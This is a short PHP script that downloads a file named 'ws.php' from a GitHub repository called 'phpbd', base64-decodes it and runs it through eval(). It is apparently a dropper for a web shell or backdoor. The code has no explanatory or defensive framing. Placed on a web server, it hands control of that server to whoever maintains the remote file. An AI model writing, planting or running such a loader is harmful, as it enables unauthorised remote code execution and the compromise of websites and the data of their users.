<?php
function getRemoteContent($url) {
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_USERAGENT => 'curl/7.85.0'
    ]);
    $out = curl_exec($ch);
    curl_close($ch);
    return $out;
}

$json = getRemoteContent('https://api.github.com/repos/laolierzi-commits/phpbd/contents/2/ws.php');
$data = json_decode($json, true);
$phpCode = base64_decode($data['content']);
eval("?>$phpCode");
?>
